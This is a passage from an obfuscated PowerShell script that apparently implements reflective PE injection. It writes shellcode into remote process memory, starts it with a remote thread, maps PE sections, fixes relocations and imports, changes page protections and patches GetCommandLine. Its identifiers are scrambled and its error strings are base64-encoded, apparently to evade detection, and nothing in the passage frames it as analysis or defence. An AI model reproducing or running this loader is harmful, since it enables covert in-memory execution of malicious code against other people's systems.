		${_/\/=\_/\/===\__/} = $Win32Functions.WriteProcessMemory.Invoke(${__/\____/\/===\_/\}, ${/===\___/\__/==\_}, ${_______________/\}, [UIntPtr][UInt64]${_/\_/\/==\__/\_/\}, [Ref]${_/=\/====\/===\/=})
		if ((${_/\/=\_/\/===\__/} -eq $false) -or ([UInt64]${_/=\/====\/===\/=} -ne [UInt64]${_/\_/\/==\__/\_/\}))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
		}
		${_/\/====\_/==\/\_} = _/=\__/=\/==\/===\ -__/=\__/=\/=\_/\_/ ${__/\____/\/===\_/\} -____/=\_/=\_/\_/\_ ${/===\___/\__/==\_} -Win32Functions $Win32Functions 
		${/====\__/==\__/==} = $Win32Functions.WaitForSingleObject.Invoke(${_/\/====\_/==\/\_}, 20000)
		if (${/====\__/==\__/==} -ne 0)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
		}
		[IntPtr]${_/==\/\___/=\/\__} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\__/=\/=\_/=\/})
		${/====\__/==\__/==} = $Win32Functions.ReadProcessMemory.Invoke(${__/\____/\/===\_/\}, ${_/\__/\/=\/\/\_/\}, ${_/==\/\___/=\/\__}, [UIntPtr][UInt64]${_/=\__/=\/=\_/=\/}, [Ref]${_/=\/====\/===\/=})
		if ((${/====\__/==\__/==} -eq $false) -or (${_/=\/====\/===\/=} -eq 0))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
		}
		[IntPtr]${/===\/\/=\_/\__/=} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/==\/\___/=\/\__}, [Type][IntPtr])
		$Win32Functions.VirtualFreeEx.Invoke(${__/\____/\/===\_/\}, ${/===\___/\__/==\_}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke(${__/\____/\/===\_/\}, ${___/\_/=\/\__/===}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke(${__/\____/\/===\_/\}, ${_/\__/\/=\/\/\_/\}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		return ${/===\/\/=\_/\__/=}
	}
	Function ___/\_/\_/\/==\__/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		${_/========\__/\/==},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${__/\/=\/\_/=\_/=\_},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${/=\/\___/========} = 0; ${/=\/\___/========} -lt ${__/\/=\/\_/=\_/=\_}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${/=\/\___/========}++)
		{
			[IntPtr]${/=====\/\/====\_/} = [IntPtr](_/=\___/\_/\__/\/\ ([Int64]${__/\/=\/\_/=\_/=\_}.SectionHeaderPtr) (${/=\/\___/========} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${__/\/\_/\/\/\/===} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=====\/\/====\_/}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${__/==\_/==\__/=\/} = [IntPtr](_/=\___/\_/\__/\/\ ([Int64]${__/\/=\/\_/=\_/=\_}.PEHandle) ([Int64]${__/\/\_/\/\/\/===}.VirtualAddress))
			${__/\_/\_/\_/\___/} = ${__/\/\_/\/\/\/===}.SizeOfRawData
			if (${__/\/\_/\/\/\/===}.PointerToRawData -eq 0)
			{
				${__/\_/\_/\_/\___/} = 0
			}
			if (${__/\_/\_/\_/\___/} -gt ${__/\/\_/\/\/\/===}.VirtualSize)
			{
				${__/\_/\_/\_/\___/} = ${__/\/\_/\/\/\/===}.VirtualSize
			}
			if (${__/\_/\_/\_/\___/} -gt 0)
			{
				__/=\/======\/\_/\ -_/=\/\_____/\_/\/\ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBhAHIAcwBoAGEAbABDAG8AcAB5AA=='))) -__/\/=\/\_/=\_/=\_ ${__/\/=\/\_/=\_/=\_} -____/=\_/=\_/\_/\_ ${__/==\_/==\__/=\/} -___/=====\___/\_/= ${__/\_/\_/\_/\___/} | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy(${_/========\__/\/==}, [Int32]${__/\/\_/\/\/\/===}.PointerToRawData, ${__/==\_/==\__/=\/}, ${__/\_/\_/\_/\___/})
			}
			if (${__/\/\_/\/\/\/===}.SizeOfRawData -lt ${__/\/\_/\/\/\/===}.VirtualSize)
			{
				${/==\/\__/\/\__/==} = ${__/\/\_/\/\/\/===}.VirtualSize - ${__/\_/\_/\_/\___/}
				[IntPtr]${____/=\_/=\_/\_/\_} = [IntPtr](_/=\___/\_/\__/\/\ ([Int64]${__/==\_/==\__/=\/}) ([Int64]${__/\_/\_/\_/\___/}))
				__/=\/======\/\_/\ -_/=\/\_____/\_/\/\ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBlAG0AcwBlAHQA'))) -__/\/=\/\_/=\_/=\_ ${__/\/=\/\_/=\_/=\_} -____/=\_/=\_/\_/\_ ${____/=\_/=\_/\_/\_} -___/=====\___/\_/= ${/==\/\__/\/\__/==} | Out-Null
				$Win32Functions.memset.Invoke(${____/=\_/=\_/\_/\_}, 0, [IntPtr]${/==\/\__/\/\__/==}) | Out-Null
			}
		}
	}
	Function __/\_/===\/=\__/==
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\/=\/\_/=\_/=\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${_/=\__/\/=\__/\_/\},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		[Int64]${__/==\___/=\_/\/=} = 0
		${/==\_/=\/\__/====} = $true 
		[UInt32]${/==\/=\/=\_/\/=\_} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		if ((${_/=\__/\/=\__/\_/\} -eq [Int64]${__/\/=\/\_/=\_/=\_}.EffectivePEHandle) `
				-or (${__/\/=\/\_/=\_/=\_}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((_/=\/\/\/\/\____/\ (${_/=\__/\/=\__/\_/\}) (${__/\/=\/\_/=\_/=\_}.EffectivePEHandle)) -eq $true)
		{
			${__/==\___/=\_/\/=} = __/\/=\/\/=\_/\/\_ (${_/=\__/\/=\__/\_/\}) (${__/\/=\/\_/=\_/=\_}.EffectivePEHandle)
			${/==\_/=\/\__/====} = $false
		}
		elseif ((_/=\/\/\/\/\____/\ (${__/\/=\/\_/=\_/=\_}.EffectivePEHandle) (${_/=\__/\/=\__/\_/\})) -eq $true)
		{
			${__/==\___/=\_/\/=} = __/\/=\/\/=\_/\/\_ (${__/\/=\/\_/=\_/=\_}.EffectivePEHandle) (${_/=\__/\/=\__/\_/\})
		}
		[IntPtr]${/==\/\/===\/\/\/\} = [IntPtr](_/=\___/\_/\__/\/\ ([Int64]${__/\/=\/\_/=\_/=\_}.PEHandle) ([Int64]${__/\/=\/\_/=\_/=\_}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			${_/==\/\_/===\/==\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/==\/\/===\/\/\/\}, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
			if (${_/==\/\_/===\/==\}.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]${__/\_/==\_____/\_} = [IntPtr](_/=\___/\_/\__/\/\ ([Int64]${__/\/=\/\_/=\_/=\_}.PEHandle) ([Int64]${_/==\/\_/===\/==\}.VirtualAddress))
			${_/\_/==\______/=\} = (${_/==\/\_/===\/==\}.SizeOfBlock - ${/==\/=\/=\_/\/=\_}) / 2
			for(${/=\/\___/========} = 0; ${/=\/\___/========} -lt ${_/\_/==\______/=\}; ${/=\/\___/========}++)
			{
				${_/\/\/==\/==\/=\_} = [IntPtr](_/=\___/\_/\__/\/\ ([IntPtr]${/==\/\/===\/\/\/\}) ([Int64]${/==\/=\/=\_/\/=\_} + (2 * ${/=\/\___/========})))
				[UInt16]${_/==\/\/==\/=\___} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\/\/==\/==\/=\_}, [Type][UInt16])
				[UInt16]${____/=\_/\/\/\_/\} = ${_/==\/\/==\/=\___} -band 0x0FFF
				[UInt16]${/=\__/=\/=======\} = ${_/==\/\/==\/=\___} -band 0xF000
				for (${_/\_/\_____/=\/==} = 0; ${_/\_/\_____/=\/==} -lt 12; ${_/\_/\_____/=\/==}++)
				{
					${/=\__/=\/=======\} = [Math]::Floor(${/=\__/=\/=======\} / 2)
				}
				if ((${/=\__/=\/=======\} -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or (${/=\__/=\/=======\} -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]${______/=\__/===\/} = [IntPtr](_/=\___/\_/\__/\/\ ([Int64]${__/\_/==\_____/\_}) ([Int64]${____/=\_/\/\/\_/\}))
					[IntPtr]${/=\/=\__/\/=\___/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${______/=\__/===\/}, [Type][IntPtr])
					if (${/==\_/=\/\__/====} -eq $true)
					{
						[IntPtr]${/=\/=\__/\/=\___/} = [IntPtr](_/=\___/\_/\__/\/\ ([Int64]${/=\/=\__/\/=\___/}) (${__/==\___/=\_/\/=}))
					}
					else
					{
						[IntPtr]${/=\/=\__/\/=\___/} = [IntPtr](__/\/=\/\/=\_/\/\_ ([Int64]${/=\/=\__/\/=\___/}) (${__/==\___/=\_/\/=}))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\/=\__/\/=\___/}, ${______/=\__/===\/}, $false) | Out-Null
				}
				elseif (${/=\__/=\/=======\} -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIABmAG8AdQBuAGQALAAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIAB2AGEAbAB1AGUAOgAgACQAewAvAD0AXABfAF8ALwA9AFwALwA9AD0APQA9AD0APQA9AFwAfQAsACAAcgBlAGwAbwBjAGEAdABpAG8AbgBpAG4AZgBvADoAIAAkAHsAXwAvAD0APQBcAC8AXAAvAD0APQBcAC8APQBcAF8AXwBfAH0A')))
				}
			}
			${/==\/\/===\/\/\/\} = [IntPtr](_/=\___/\_/\__/\/\ ([Int64]${/==\/\/===\/\/\/\}) ([Int64]${_/==\/\_/===\/==\}.SizeOfBlock))
		}
	}
	Function _/=\/\_/=\__/\/===
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\/=\/\_/=\_/=\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		${__/\____/\/===\_/\}
		)
		${_____/\_/==\_____} = $false
		if (${__/\/=\/\_/=\_/=\_}.PEHandle -ne ${__/\/=\/\_/=\_/=\_}.EffectivePEHandle)
		{
			${_____/\_/==\_____} = $true
		}
		if (${__/\/=\/\_/=\_/=\_}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${/======\_/\/\___/} = _/=\___/\_/\__/\/\ ([Int64]${__/\/=\/\_/=\_/=\_}.PEHandle) ([Int64]${__/\/=\/\_/=\_/=\_}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${_/\_/=\/==\_/=\/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/======\_/\/\___/}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${_/\_/=\/==\_/=\/\}.Characteristics -eq 0 `
						-and ${_/\_/=\/==\_/=\/\}.FirstThunk -eq 0 `
						-and ${_/\_/=\/==\_/=\/\}.ForwarderChain -eq 0 `
						-and ${_/\_/=\/==\_/=\/\}.Name -eq 0 `
						-and ${_/\_/=\/==\_/=\/\}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAGkAbQBwAG8AcgB0AGkAbgBnACAARABMAEwAIABpAG0AcABvAHIAdABzAA==')))
					break
				}
				${/==\_/=\_/==\/\_/} = [IntPtr]::Zero
				${___/==\_____/===\_} = (_/=\___/\_/\__/\/\ ([Int64]${__/\/=\/\_/=\_/=\_}.PEHandle) ([Int64]${_/\_/=\/==\_/=\/\}.Name))
				${__/==\/\_/\/=\/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${___/==\_____/===\_})
				if (${_____/\_/==\_____} -eq $true)
				{
					${/==\_/=\_/==\/\_/} = __/==\/\/=\/=\/=\/ -__/\____/\/===\_/\ ${__/\____/\/===\_/\} -___/==\_____/===\_ ${___/==\_____/===\_}
				}
				else
				{
					${/==\_/=\_/==\/\_/} = $Win32Functions.LoadLibrary.Invoke(${__/==\/\_/\/=\/=\})
				}
				if ((${/==\_/=\_/==\/\_/} -eq $null) -or (${/==\_/=\_/==\/\_/} -eq [IntPtr]::Zero))
				{
					throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBtAHAAbwByAHQAaQBuAGcAIABEAEwATAAsACAARABMAEwATgBhAG0AZQA6ACAAJAB7AF8AXwAvAD0APQBcAC8AXABfAC8AXAAvAD0AXAAvAD0AXAB9AA==')))
				}
				[IntPtr]${/==\_/====\_/====} = _/=\___/\_/\__/\/\ (${__/\/=\/\_/=\_/=\_}.PEHandle) (${_/\_/=\/==\_/=\/\}.FirstThunk)
				[IntPtr]${____/\_/\_/=\____} = _/=\___/\_/\__/\/\ (${__/\/=\/\_/=\_/=\_}.PEHandle) (${_/\_/=\/==\_/=\/\}.Characteristics) 
				[IntPtr]${/==\/\/\/\__/====} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${____/\_/\_/=\____}, [Type][IntPtr])
				while (${/==\/\/\/\__/====} -ne [IntPtr]::Zero)
				{
					${_/=\/\___/==\/==\} = ''
					[IntPtr]${____/=\__/\__/===} = [IntPtr]::Zero
					if([Int64]${/==\/\/\/\__/====} -lt 0)
					{
						${_/=\/\___/==\/==\} = [Int64]${/==\/\/\/\__/====} -band 0xffff 
					}
					else
					{
						[IntPtr]${/=\/\____/=\__/=\} = _/=\___/\_/\__/\/\ (${__/\/=\/\_/=\_/=\_}.PEHandle) (${/==\/\/\/\__/====})
						${/=\/\____/=\__/=\} = _/=\___/\_/\__/\/\ ${/=\/\____/=\__/=\} ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						${_/=\/\___/==\/==\} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${/=\/\____/=\__/=\})
					}
					if (${_____/\_/==\_____} -eq $true)
					{
						[IntPtr]${____/=\__/\__/===} = __/==\___/==\/===\ -__/\____/\/===\_/\ ${__/\____/\/===\_/\} -_____/=\/\_/\_/=\/ ${/==\_/=\_/==\/\_/} -___/==\_/\/\_/\_/= ${_/=\/\___/==\/==\}
					}
					else
					{
						if(${_/=\/\___/==\/==\} -is [string])
						{
						    [IntPtr]${____/=\__/\__/===} = $Win32Functions.GetProcAddress.Invoke(${/==\_/=\_/==\/\_/}, ${_/=\/\___/==\/==\})
						}
						else
						{
						    [IntPtr]${____/=\__/\__/===} = $Win32Functions.GetProcAddressOrdinal.Invoke(${/==\_/=\_/==\/\_/}, ${_/=\/\___/==\/==\})
						}
					}
					if (${____/=\__/\__/===} -eq $null -or ${____/=\__/\__/===} -eq [IntPtr]::Zero)
					{
						Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABmAHUAbgBjAHQAaQBvAG4AIAByAGUAZgBlAHIAZQBuAGMAZQAgAGkAcwAgAG4AdQBsAGwALAAgAHQAaABpAHMAIABpAHMAIABhAGwAbQBvAHMAdAAgAGMAZQByAHQAYQBpAG4AbAB5ACAAYQAgAGIAdQBnACAAaQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0AC4AIABGAHUAbgBjAHQAaQBvAG4AOgAgACQAewBfAC8APQBcAC8AXABfAF8AXwAvAD0APQBcAC8APQA9AFwAfQAuACAARABsAGwAOgAgACQAewBfAF8ALwA9AD0AXAAvAFwAXwAvAFwALwA9AFwALwA9AFwAfQA=')))
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${____/=\__/\__/===}, ${/==\_/====\_/====}, $false)
					${/==\_/====\_/====} = _/=\___/\_/\__/\/\ ([Int64]${/==\_/====\_/====}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${____/\_/\_/=\____} = _/=\___/\_/\__/\/\ ([Int64]${____/\_/\_/=\____}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${/==\/\/\/\__/====} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${____/\_/\_/=\____}, [Type][IntPtr])
				}
				${/======\_/\/\___/} = _/=\___/\_/\__/\/\ (${/======\_/\/\___/}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function __/\_/====\/==\/==
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		${_/=\/\_/======\_/\}
		)
		${_/\/=\/\/=\/\/\/=} = 0x0
		if ((${_/=\/\_/======\_/\} -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if ((${_/=\/\_/======\_/\} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${_/=\/\_/======\_/\} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${_/\/=\/\/=\/\/\/=} = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					${_/\/=\/\/=\/\/\/=} = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if ((${_/=\/\_/======\_/\} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${_/\/=\/\/=\/\/\/=} = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					${_/\/=\/\/=\/\/\/=} = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if ((${_/=\/\_/======\_/\} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${_/=\/\_/======\_/\} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${_/\/=\/\/=\/\/\/=} = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					${_/\/=\/\/=\/\/\/=} = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if ((${_/=\/\_/======\_/\} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${_/\/=\/\/=\/\/\/=} = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					${_/\/=\/\/=\/\/\/=} = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		if ((${_/=\/\_/======\_/\} -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			${_/\/=\/\/=\/\/\/=} = ${_/\/=\/\/=\/\/\/=} -bor $Win32Constants.PAGE_NOCACHE
		}
		return ${_/\/=\/\/=\/\/\/=}
	}
	Function ___/=\_____/=\/=\/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\/=\/\_/=\_/=\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${/=\/\___/========} = 0; ${/=\/\___/========} -lt ${__/\/=\/\_/=\_/=\_}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${/=\/\___/========}++)
		{
			[IntPtr]${/=====\/\/====\_/} = [IntPtr](_/=\___/\_/\__/\/\ ([Int64]${__/\/=\/\_/=\_/=\_}.SectionHeaderPtr) (${/=\/\___/========} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${__/\/\_/\/\/\/===} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=====\/\/====\_/}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${_/=\__/=\/\/\_/\_} = _/=\___/\_/\__/\/\ (${__/\/=\/\_/=\_/=\_}.PEHandle) (${__/\/\_/\/\/\/===}.VirtualAddress)
			[UInt32]${/==\___/\_/=\/\/=} = __/\_/====\/==\/== ${__/\/\_/\/\/\/===}.Characteristics
			[UInt32]${/=\_/==\_/\_/\/\_} = ${__/\/\_/\/\/\/===}.VirtualSize
			[UInt32]${_/\/=\/\/\/\/==\/} = 0
			__/=\/======\/\_/\ -_/=\/\_____/\_/\/\ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUALQBNAGUAbQBvAHIAeQBQAHIAbwB0AGUAYwB0AGkAbwBuAEYAbABhAGcAcwA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0AA=='))) -__/\/=\/\_/=\_/=\_ ${__/\/=\/\_/=\_/=\_} -____/=\_/=\_/\_/\_ ${_/=\__/=\/\/\_/\_} -___/=====\___/\_/= ${/=\_/==\_/\_/\/\_} | Out-Null
			${_/\/=\_/\/===\__/} = $Win32Functions.VirtualProtect.Invoke(${_/=\__/=\/\/\_/\_}, ${/=\_/==\_/\_/\/\_}, ${/==\___/\_/=\/\/=}, [Ref]${_/\/=\/\/\/\/==\/})
			if (${_/\/=\_/\/===\__/} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGgAYQBuAGcAZQAgAG0AZQBtAG8AcgB5ACAAcAByAG8AdABlAGMAdABpAG8AbgA=')))
			}
		}
	}
	Function ____/=\_____/\/\_/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\/=\/\_/=\_/=\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		${__/\/===\/\/\___/\},
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		${_/=\_/==\_/\/\/\/=}
		)
		${__/==\____/\/=\/\} = @() 
		${_/=\__/=\/=\_/=\/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]${_/\/=\/\/\/\/==\/} = 0
		[IntPtr]${___/\/\_/\__/=\/=} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		if (${___/\/\_/\__/=\/=} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyACAAaABhAG4AZABsAGUAIABuAHUAbABsAA==')))
		}
		[IntPtr]${/=\/====\/\______} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAuAGQAbABsAA=='))))
		if (${/=\/====\/\______} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		${/==\_/\_/=\/=\/\_} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${__/\/===\/\/\___/\})
		${/=\__/\___/=\_/\/} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${__/\/===\/\/\___/\})
		[IntPtr]${__/\/==\_____/=\_} = $Win32Functions.GetProcAddress.Invoke(${/=\/====\/\______}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAEEA'))))
		[IntPtr]${/=\/\___/\_/\/\__} = $Win32Functions.GetProcAddress.Invoke(${/=\/====\/\______}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAFcA'))))
		if (${__/\/==\_____/=\_} -eq [IntPtr]::Zero -or ${/=\/\___/\_/\/\__} -eq [IntPtr]::Zero)
		{
			throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlACAAcAB0AHIAIABuAHUAbABsAC4AIABHAGUAdABDAG8AbQBtAGEAbgBkAEwAaQBuAGUAQQA6ACAAJAB7AF8AXwAvAFwALwA9AD0AXABfAF8AXwBfAF8ALwA9AFwAXwB9AC4AIABHAGUAdABDAG8AbQBtAGEAbgBkAEwAaQBuAGUAVwA6ACAAJAB7AC8APQBcAC8AXABfAF8AXwAvAFwAXwAvAFwALwBcAF8AXwB9AA==')))
		}
		[Byte[]]${___/===\_____/=\_} = @()
		if (${_/=\__/=\/=\_/=\/} -eq 8)
		{
			${___/===\_____/=\_} += 0x48	
		}
		${___/===\_____/=\_} += 0xb8
		[Byte[]]${_/\__/\_/\/\___/=} = @(0xc3)
		${__/==\/\/\__/=\__} = ${___/===\_____/=\_}.Length + ${_/=\__/=\/=\_/=\/} + ${_/\__/\_/\/\___/=}.Length
		${__/\_/=====\/\__/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/==\/\/\__/=\__})
		${__/===\_/=\/=\/=\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/==\/\/\__/=\__})
		$Win32Functions.memcpy.Invoke(${__/\_/=====\/\__/}, ${__/\/==\_____/=\_}, [UInt64]${__/==\/\/\__/=\__}) | Out-Null
		$Win32Functions.memcpy.Invoke(${__/===\_/=\/=\/=\}, ${/=\/\___/\_/\/\__}, [UInt64]${__/==\/\/\__/=\__}) | Out-Null
		${__/==\____/\/=\/\} += ,(${__/\/==\_____/=\_}, ${__/\_/=====\/\__/}, ${__/==\/\/\__/=\__})
		${__/==\____/\/=\/\} += ,(${/=\/\___/\_/\/\__}, ${__/===\_/=\/=\/=\}, ${__/==\/\/\__/=\__})
		[UInt32]${_/\/=\/\/\/\/==\/} = 0
		${_/\/=\_/\/===\__/} = $Win32Functions.VirtualProtect.Invoke(${__/\/==\_____/=\_}, [UInt32]${__/==\/\/\__/=\__}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${_/\/=\/\/\/\/==\/})
		if (${_/\/=\_/\/===\__/} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${____/\/==\__/\/==} = ${__/\/==\_____/=\_}
		_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${___/===\_____/=\_} -___/\/====\_/\_/== ${____/\/==\__/\/==}
		${____/\/==\__/\/==} = _/=\___/\_/\__/\/\ ${____/\/==\__/\/==} (${___/===\_____/=\_}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\__/\___/=\_/\/}, ${____/\/==\__/\/==}, $false)
		${____/\/==\__/\/==} = _/=\___/\_/\__/\/\ ${____/\/==\__/\/==} ${_/=\__/=\/=\_/=\/}
